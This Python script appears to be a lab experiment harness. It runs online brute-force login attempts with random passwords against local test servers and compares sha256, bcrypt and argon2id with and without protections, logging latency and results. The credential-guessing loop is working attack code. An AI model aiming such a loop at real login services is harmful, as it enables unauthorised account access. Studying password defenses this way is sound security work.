import requests
import string
import time
import os
import json
import random
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

# ======================================
# GENERAL SETTINGS
# ======================================
TOTAL_ATTEMPTS_PER_CONFIG = 50000
MAX_TIME = 7200
GROUP_SEED = 6631928

os.makedirs("logs", exist_ok=True)

# ======================================
# USERS + CATEGORIES
# ======================================
USERS = {
    "weak": {
        "username": "user01",
        "charset": string.ascii_lowercase + string.digits,
        "min_len": 4,
        "max_len": 6
    },
    "medium": {
        "username": "user11",
        "charset": string.ascii_letters + string.digits,
        "min_len": 7,
        "max_len": 10
    },
    "strong": {
        "username": "user21",
        "charset": string.ascii_letters + string.digits + "!@#$%^&*",
        "min_len": 11,
        "max_len": 16
    }
}

ATTEMPTS_PER_CATEGORY = TOTAL_ATTEMPTS_PER_CONFIG // 3

# ======================================
# PASSWORD GENERATOR
# ======================================
def random_password(charset, min_len, max_len):
    L = random.randint(min_len, max_len)
    return ''.join(random.choice(charset) for _ in range(L))

# ======================================
# LOGIN (fast version)
# Using requests.Session to reuse connections = 2–3× faster
# ======================================
def send_attempt(session, url, username, password):
    t0 = time.time()
    try:
        r = session.post(url, json={"username": username, "password": password})
        latency = (time.time() - t0) * 1000
        data = r.json()
        return data.get("status"), latency
    except:
        return "error", (time.time() - t0) * 1000

# ======================================
# ATTACK FUNCTION
# ======================================
def brute_force_attack(url, hash_mode, protections_flag, logfile):

    start_time = time.time()

    # Warm-up session (reuses TCP connection)
    session = requests.Session()
    session.post(url, json={"username": "test", "password": "test"})

    # Write header once
    with open(logfile, "w") as f:
        f.write("===========================================\n")
        f.write("              BRUTE FORCE LOG\n")
        f.write("===========================================\n")
        f.write(f"Start Time: {time.ctime(start_time)}\n")
        f.write(f"Hash Mode: {hash_mode}\n")
        f.write(f"Protections: {protections_flag}\n")
        f.write(f"Total attempts per config: {TOTAL_ATTEMPTS_PER_CONFIG}\n")
        f.write(f"Attempts per category: {ATTEMPTS_PER_CATEGORY}\n")
        f.write("Categories order: weak -> medium -> strong\n")
        f.write("===========================================\n\n")

    print(f"\n>>> START brute-force: {hash_mode}, protections={protections_flag}")
    print(f"→ Log: {logfile}")

    # Buffer to write less often (reduces disk operations)
    write_buffer = []
    FLUSH_EVERY = 500  # safe, fast, doesn't affect JSON format

    for category, cfg in USERS.items():

        username = cfg["username"]
        charset = cfg["charset"]
        min_len = cfg["min_len"]
        max_len = cfg["max_len"]

        print(f"--- Starting category: {category} ({username}) ---")

        for i in tqdm(range(ATTEMPTS_PER_CATEGORY),
                      desc=f"{hash_mode}-{protections_flag}-{category}"):

            if time.time() - start_time >= MAX_TIME:
                with open(logfile, "a") as f:
                    f.write(f"\n[TIME LIMIT REACHED] after {round(time.time()-start_time,2)} sec\n")
                return

            pwd = random_password(charset, min_len, max_len)
            status, lat_ms = send_attempt(session, url, username, pwd)

            entry = {
                "timestamp": time.time(),
                "group_seed": GROUP_SEED,
                "username": username,
                "category": category,
                "password_attempt": pwd,
                "result": status,
                "latency_ms": round(lat_ms, 3),
                "hash_mode": hash_mode,
                "protection_flags": protections_flag
            }

            write_buffer.append(json.dumps(entry))

            # flush buffer to disk every FLUSH_EVERY entries
            if len(write_buffer) >= FLUSH_EVERY:
                with open(logfile, "a") as f:
                    f.write("\n".join(write_buffer) + "\n")
                write_buffer = []

            if status == "success":
                print(f"[SUCCESS] {username} -> {pwd}")
                with open(logfile, "a") as f:
                    f.write("\n=== SUCCESS ===\n")
                    f.write(f"Username: {username}\nPassword: {pwd}\n")
                return

    # Final flush
    if write_buffer:
        with open(logfile, "a") as f:
            f.write("\n".join(write_buffer) + "\n")

    print(f"✔ Completed all categories for {hash_mode} / {protections_flag}")

# ======================================
# MAIN
# ======================================
def main():

    CONFIGS = [
        ("sha256",   "OFF", "http://127.0.0.1:6000/login"),
        ("sha256",   "ON",  "http://127.0.0.1:5000/login"),

        ("bcrypt",   "OFF", "http://127.0.0.1:6000/login"),
        ("bcrypt",   "ON",  "http://127.0.0.1:5000/login"),

        ("argon2id", "OFF", "http://127.0.0.1:6000/login"),
        ("argon2id", "ON",  "http://127.0.0.1:5000/login"),
    ]

    with ThreadPoolExecutor(max_workers=6) as executor:
        for hash_mode, prot, url in CONFIGS:

            try:
                requests.post(url.replace("/login", "/reset"))
            except:
                pass

            logfile = f"logs/{hash_mode}_{'with' if prot=='ON' else 'no'}_protection.log"

            executor.submit(brute_force_attack, url, hash_mode, prot, logfile)

main()
